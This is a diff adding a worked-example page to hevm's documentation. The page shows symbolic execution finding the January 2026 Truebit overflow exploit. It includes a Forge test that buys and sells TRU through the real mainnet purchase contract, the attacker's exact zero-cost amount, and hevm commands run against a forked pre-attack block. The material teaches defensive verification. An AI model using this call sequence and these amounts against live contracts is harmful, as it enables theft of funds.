@@ -1292,6 +1292,155 @@ End State:
 the <code>assert</code> tested for. Notice that the panic exception is of type <code>01</code>, which
 is what's expected for an <a href="https://docs.soliditylang.org/en/latest/control-structures.html"><code>assert</code> failure in
 solidity</a>.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="worked-example-finding-the-truebit-exploit"><a class="header" href="#worked-example-finding-the-truebit-exploit">Worked Example: Finding the Truebit Exploit</a></h1>
+<p>On 8 January 2026 an attacker drained 8535 ETH (about $26.6M) from Truebit's
+token purchase contract in a single transaction. This page shows how hevm
+finds that exploit on its own, given only the deployed bytecode and a property
+that the developers could have written before deploying: buying tokens and
+selling them straight back is never profitable.</p>
+<p>The test runs against the state of Ethereum mainnet at the block before the
+attack, fetched over RPC, so no contract source or local deployment is needed.</p>
+<h2 id="the-bug"><a class="header" href="#the-bug">The Bug</a></h2>
+<p>Truebit sells and buys back its TRU token from a purchase contract at
+<code>0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2</code>, a proxy whose implementation was
+never source-verified. Its functions include:</p>
+<ul>
+<li><code>getPurchasePrice(amount)</code>: the ETH price of buying <code>amount</code> TRU,</li>
+<li><code>buyTRU(amount)</code>: mints <code>amount</code> TRU for that price, paid as <code>msg.value</code>,</li>
+<li><code>sellTRU(amount)</code>: burns <code>amount</code> TRU and pays ETH back from the reserve.</li>
+</ul>
+<p>The contract was compiled with a Solidity version older than 0.8, which does not
+check arithmetic for overflow. Public analyses of the decompiled bytecode show
+that the purchase price is a quadratic in <code>amount</code>, roughly</p>
+<pre><code class="language-plain">price = (100 * amount^2 * reserve + 200 * totalSupply * amount * reserve) / (25 * totalSupply^2)
+</code></pre>
+<p>where each multiplication is checked, but the addition of the two terms is not.
+For a large enough <code>amount</code> the sum wraps around modulo 2^256 and the price
+becomes tiny, or zero. The attacker bought about 240 million TRU for 0 ETH and
+sold them back for 5105 ETH, then repeated this with other amounts.</p>
+<h2 id="the-property"><a class="header" href="#the-property">The Property</a></h2>
+<p>Without knowing anything about the bug, a developer can state what the contract
+must never allow: buying some amount of TRU at the quoted price and immediately
+selling it back must not return more ETH than was paid. With <code>amount</code> as a
+symbolic argument, hevm checks this for every possible amount at once.</p>
+<h2 id="running-it"><a class="header" href="#running-it">Running It</a></h2>
+<p>You need <a href="https://book.getfoundry.sh/">Foundry</a>, hevm, and the URL of an
+Ethereum mainnet archive node in <code>ETH_RPC_URL</code>. The free tier of a provider
+such as Alchemy works.</p>
+<p>First, create a Forge project:</p>
+<pre><code class="language-plain">forge init --no-git truebit
+cd truebit
+</code></pre>
+<p>Then save the test as <code>test/Truebit.t.sol</code>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {Test} from "forge-std/Test.sol";
+
+interface ITruebitPurchase {
+    function buyTRU(uint256 amount) external payable;
+    function sellTRU(uint256 amount) external;
+    function getPurchasePrice(uint256 amount) external view returns (uint256);
+}
+
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+contract TruebitTest is Test {
+    ITruebitPurchase constant PURCHASE = ITruebitPurchase(0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2);
+    IERC20 constant TRU = IERC20(0xf65B5C5104c4faFD4b709d9D60a185eAE063276c);
+
+    receive() external payable {}
+
+    function buyThenSell(uint256 amount) internal returns (uint256 paid, uint256 got) {
+        paid = PURCHASE.getPurchasePrice(amount);
+        vm.deal(address(this), paid);
+        PURCHASE.buyTRU{value: paid}(amount);
+        TRU.approve(address(PURCHASE), amount);
+        PURCHASE.sellTRU(amount);
+        got = address(this).balance;
+    }
+
+    // the attacker's first round
+    function prove_replay_exploit() public {
+        (uint256 paid, uint256 got) = buyThenSell(240442509453545333947284131);
+        assertEq(paid, 0);
+        assertGt(got, 5000 ether);
+    }
+
+    function prove_buy_sell_no_profit(uint256 amount) public {
+        (uint256 paid, uint256 got) = buyThenSell(amount);
+        assertLe(got, paid);
+    }
+}
+</code></pre>
+<p>The test contract starts with no ETH, so <code>buyThenSell</code> gives it exactly the
+quoted price with <code>vm.deal</code>. Whatever it holds after selling is what the sale
+returned.</p>
+<p>Build it:</p>
+<pre><code class="language-plain">forge build --ast
+</code></pre>
+<h3 id="replaying-the-attack"><a class="header" href="#replaying-the-attack">Replaying the Attack</a></h3>
+<p>As a sanity check, run the attacker's first round with concrete values. The
+<code>--rpc</code> and <code>--number</code> options make hevm fetch contracts and storage from block
+24190506, the block before the attack:</p>
+<pre><code class="language-plain">$ hevm test --root . --rpc "$ETH_RPC_URL" --number 24190506 --match prove_replay_exploit
+Checking 1 function(s) in contract test/Truebit.t.sol:TruebitTest
+[RUNNING] prove_replay_exploit()
+   [PASS] prove_replay_exploit
+</code></pre>
+<p>So at that block, the attacker's amount really did cost nothing and sell for
+more than 5000 ETH.</p>
+<h3 id="finding-the-attack"><a class="header" href="#finding-the-attack">Finding the Attack</a></h3>
+<p>Now let hevm look for a violation of the property, with <code>amount</code> symbolic:</p>
+<pre><code class="language-plain">$ hevm test --root . --rpc "$ETH_RPC_URL" --number 24190506 --match prove_buy_sell_no_profit --smt-timeout 600
+Checking 1 function(s) in contract test/Truebit.t.sol:TruebitTest
+[RUNNING] prove_buy_sell_no_profit(uint256)
+   Counterexample:   [validated]
+     calldata: prove_buy_sell_no_profit(243330867036744954592876282)
+     result:   Revert: Error("assertion failed: 5586696040365474381874 &gt; 3044085806507062090326")
+   [FAIL] prove_buy_sell_no_profit
+   [WARNING] hevm was only able to partially explore the test prove_buy_sell_no_profit due to:
+      1x -&gt; SMT solver says: Result unknown by SMT solver
+</code></pre>
+<p>This took about 35 minutes on 16 cores. hevm found an amount for which buying
+costs 3044 ETH but selling returns 5587 ETH. The SMT solver may well return a
+different amount: in our runs it also found 240442509453545333947284168, which
+is 37 away from the attacker's amount and, like it, costs 0 ETH.</p>
+<h2 id="what-hevm-did"><a class="header" href="#what-hevm-did">What hevm Did</a></h2>
+<ul>
+<li><strong>Fetched only what it needed.</strong> hevm starts from an empty state and fetches
+each account and storage slot from the RPC node the first time execution
+touches it. Everything fetched is cached in the user's cache directory, so
+running the test again makes no RPC requests.</li>
+<li><strong>Executed the bytecode symbolically.</strong> <code>amount</code> is a symbolic 256-bit value.
+At every branch whose condition depends on it, such as the checks in
+<code>buyTRU</code> and <code>sellTRU</code>, hevm asks the SMT solver which sides are possible and
+explores each of them, about a hundred paths here.</li>
+<li><strong>Asked the solver for a violation.</strong> At the end of each path, hevm asks
+whether some <code>amount</code> makes <code>got &gt; paid</code>. Finding one means solving the
+non-linear, wrapping price arithmetic above, which is why the solver needs
+several minutes per query.</li>
+<li><strong>Validated the counterexample.</strong> hevm reran the test concretely with the
+amount it found, against the same fetched state, and the assertion failed
+again. That is what <code>[validated]</code> means, and the <code>result</code> line shows the
+values from that rerun.</li>
+</ul>
+<p>The warning says that one solver query did not finish within the timeout. hevm
+reports that the exploration was partial, but the counterexample it did find is
+real, as the validation shows.</p>
+<h2 id="tips"><a class="header" href="#tips">Tips</a></h2>
+<ul>
+<li>The default <code>--smt-timeout</code> is too short here: the queries that find the
+exploit take 5 to 6 minutes each. If a run ends with only "Result unknown"
+warnings, try a longer timeout.</li>
+<li>Pin the block with <code>--number</code>. Without it, hevm uses the latest block, where
+the contract's state is different, and the RPC cache is not used.</li>
+<li>To understand where time goes, <code>--progress-log FILE</code> writes a JSON log of
+each solver query and how long it took, and <code>--dump-unsolved DIR</code> saves the
+queries the solver could not answer as SMT2 files.</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="hevm-test"><a class="header" href="#hevm-test"><code>hevm test</code></a></h1>
 <pre><code class="language-plain">Usage: hevm test [--root STRING] [--project-type PROJECTTYPE] [--rpc TEXT]
                  [--number W256] [--verb INT] [--match STRING]
